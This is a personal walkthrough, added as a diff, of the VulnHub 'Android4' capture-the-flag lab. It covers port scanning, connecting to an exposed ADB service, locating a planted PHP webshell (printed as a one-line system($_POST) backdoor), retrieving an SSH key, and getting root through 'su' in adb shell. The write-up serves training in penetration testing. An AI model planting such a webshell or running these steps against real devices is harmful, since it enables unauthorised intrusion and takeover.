@@ -1,0 +1,133 @@
+***VULNHUB:ANDROID4:WRITEUP***
+
+ENUMERATION
+ * netdiscover -r 192.168.56.0/24
+   * IP Address: 192.168.56.105 
+ * sudo nmap -v -sS -A -Pn -T5 -p- -oN scan 192.168.56.105 
+   * Port 5555 freeciv?
+   * Port 8080 http PHP cli server 5.5 or later
+   * Port 22000 ssh Dropbear sshd 2014.66 (protocol 2.0)
+   * OS: Linux 3.2-4.9
+ * dirb http://192.168.56.105:8080 /usr/share/wordlists/dirb/common.txt -o dirb
+   * /.htaccess
+ * Manual Observation through Browser
+   * I am greeted with a message at the home page
+     * "Good Hackers ? means
+        we drop here our backdoor for access
+        If you r Smart Dan find Backdoor access...and safe your machine
+        we like POST things only." 
+   * I check /robots.txt. It does not exist.
+   * I check /.htaccess
+     * A binary file is downloaded to my Kali box. 
+     * I open the file in a text editor and read it's contents.
+     * "Deny from all"
+ * General Research
+   * freeciv is a mobile open source game
+   * Dropbear ssh is a vulnerable ssh client
+
+COMPILING INFORMATION
+ * Privelage Escalation through freeciv vulnerability
+   * CVE-2010-2445
+   * Looked into freeciv. If the version is below 2.2.1, then it is vulnerable to arbitrary code execution. 
+   * No technical details of exploit are publically available, so I'd have to craft this myself.
+   * I could first gain user privelages to the device, then through the freeciv application, upload and run a privelage excalation script 
+   * Will shelve this vulnerability for now
+ * Enter through Port 8080 Backdoor
+   * Upon entering the webpage, we're given hints of a backdoor being available through a POST request. 
+   * Upon inspection with a Burp proxy, i get no POST requests.
+   * I found the .htaccess file, with a 'deny from all' rule in place. This may be playing a part. 
+   * I attempt to send a POST request using the curl command to the server. I get no response. I realize I need to find the php backdoor file, and call that within the curl command.
+   * I will be able to utilize the backdoor through a curl POST command, however I need to find the backdoor file first. 
+   * I tried enumerating more through dirb, however find no new information.
+   * I decide to do more research into PHP server version vulnerabilities to shed more light on this attack vector.
+ * I research more into 'PHP Cli server 5.5 or later'
+   * I find no relavent information. All exploits related to Apache being installed on the server (and it is not).
+   * I don't think looking into this will be fruitfull, so I move on.
+ * SSH Dropbear
+   * Attempted connecting through CLI. No Success.
+   * Found no relavant information through researching of service.
+
+PLAN OF ATTACK
+ * Utilize backdoor that is left on server by 'good hackers'.
+   * Should be a php file.
+   * Should be accessable through a POST request. May be able to do so through the curl command.
+ * Main issue is that the location of the php backdoor file is not given, so more enumeration is needed. This will be my next task.
+ * After a while of enumeration, I decided to look at a hint. I opened up a guide long enough to see that I was expected to utilize ADB (Android Debug Bridge), and potentially a related MSF module.
+   * I hadn't thought of using an Android specific software, so this is helpful.
+   * I don't know that I must use a MSF module, but I'll see when I get there. 
+ * For now, I have installed and connected the Android device using ADB.
+   * Command used: adb connect 192.168.56.105
+   * LPORT: 5037, RPORT: 5555
+
+ENUMERATING USING ADB
+ * adb is connected to 192.168.56.105:5555
+ * adb shell ls -lR | grep php
+   * This gives me an output with several php files, two of which are named backdoor.php
+   * This confirms the existance of a backdoor file, however not it's location
+   * This does also give me the groupname of backdoor.php, which I can use later
+     * sdcard_r
+ * adb shell
+   * Unfortunately I don't know the groupid of sdcard_r, which I will need for a later command
+     * id -p
+       * This will give me a list of groups and their associated ids.
+       * 1028(sdcard_r)
+   * find / -group 1028 | grep php | grep backdoor.php
+     * This will search for all files from the root directory onwards that are owned by the sdcard_r group
+     * It will then sort out everything with the name 'backdoor.php', with it's entire pathname attached.
+   * Filepaths
+     * /mnt/shell/emulated/0/www/public/announce/backdoor.php
+     * /mnt/shell/emulated/0/www/public/backdoor.php
+ * Examining backdoor files
+   * I exit the adb shell session.
+   * I bring the two backdoor files back to my Kali box using the pull command
+     * adb pull /mnt/shell/emulated/0/www/public/announce/backdoor.php ./backdoor1.php
+     * adb pull /mnt/shell/emulated/0/www/public/backdoor.php ./backdoor2.php
+   * I read each file. backdoor1 has proper php code. backdoor2 simply echoes 'fake'
+   * I rename backdoor 1 as 'backdoor.php', and backdoor2 as 'backdoorFAKE.php'
+   * The proper backdoor.php file is a one liner of php code
+     * <?php system($_POST['secret']);?>
+   * My next task is to learn how to call this file from the server using a POST request...
+
+POST REQUEST ON BACKDOOR
+ * curl -X POST http://192.168.56.105:8080/mnt/shell/emulated/0/www/public/announce/backdoor.php
+   * Got error stating that file could not be found on the server.
+ * Navigated to the filepath through the web browser
+   * Got error stating that file could not be found on the server.
+ * Need to figure out why files cannot be seen through http or POST request even though the filepath is accurate (and verified through manual navigation on the server)
+ * Was navigating through the directory structure using the 'adb shell' command, when I found some interesting directories
+   * 'hello', but is empty. 'backup', but is empty.
+   * 'secret22000', and has an SSH key within the directory. 22000 is the Port number of the SSH service. 
+     * /mnt/shell/emulated/0/www/public/secret22000/touhid.key
+     * This could be very useful. 
+     * I leave the shell and pull the file to my Kali box to be used later.
+
+ATTEMPTING SSH
+ * Attempted to SSH to android device using the private key.
+ * A passphrase was requested. 
+ * I searched throughout the android directory for the passphrase, but couldn't find one.
+ * This may have been useful in order to have a higher level of privelage when accessing the android command line.
+ * Will have to shelve this for now, and go back to focusing on the POST request attack vector.
+
+POST REQUEST ON BACKDOOR
+ * So far, the main issue with this attack is that something is stopping us from opening some files within [what i believe to be] the webroot through HTTP [and POST requests].
+ * It seems to be a permission issue. 
+   * Earlier I found a file through the web browser called '.htaccess' that read 'Deny from all'.
+   * It seems that I need to find a way to edit this file.
+   * Unfortunately, I cannot find this file through any previously attempted search method within the server when entering through the 'adb shell' command call.
+   * There might be a permission issue stopping me from seeing this file (as it should be right within the webroot)
+   * Perhaps I need to use the SSH private key (and find the SSH passphrase), allowing myself access to the Android device with higher privelages, allowing me to then see have the rights to see and edit the .htaccess file [and then have the right to send the POST request].
+ * Seems like the move is to either
+   * Search for the .htaccess file through the 'adb shell' session
+   * Search for the SSH passphrase [most likely through the 'adb shell' session], login through SSH, and find the .htaccess file.
+
+I GOT LOST
+ * At this point, I figured I needed a nudge in the right direction, so I looked up a guide.
+ * su root; cd /data/root; cat flag.txt
+ * You can run these commands no problem within 'adb shell'
+ * I did so within the adb shell and immediately owned the box.
+   * No POST request needed
+   * No SSH Private Key Passphrase needed
+   * No .htaccess file permission changes needed
+ * Sometimes the front door is left open.
+
+PWNED 
